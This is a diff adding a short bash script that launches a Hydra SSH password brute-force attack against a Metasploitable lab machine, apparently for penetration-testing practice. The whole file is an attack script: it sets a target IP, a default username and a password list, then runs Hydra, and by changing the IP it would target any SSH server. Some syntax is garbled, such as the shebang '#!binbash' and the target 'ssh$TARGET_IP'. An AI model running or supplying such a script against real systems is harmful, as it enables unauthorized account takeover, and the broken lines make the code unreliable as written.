@@ -1,0 +1,9 @@
+#!binbash
+# Configuration
+TARGET_IP=192.168.56.103     # Replace with your Metasploitable IP
+USERNAME=vagrant       # Known default user on Metasploitable
+PASSWORD_LIST=passwords.txt  # Make sure this file exists
+
+# Run Hydra
+echo [] Starting SSH brute-force attack on $TARGET_IP...
+hydra -l $USERNAME -P $PASSWORD_LIST ssh$TARGET_IP -t 5 -f -V
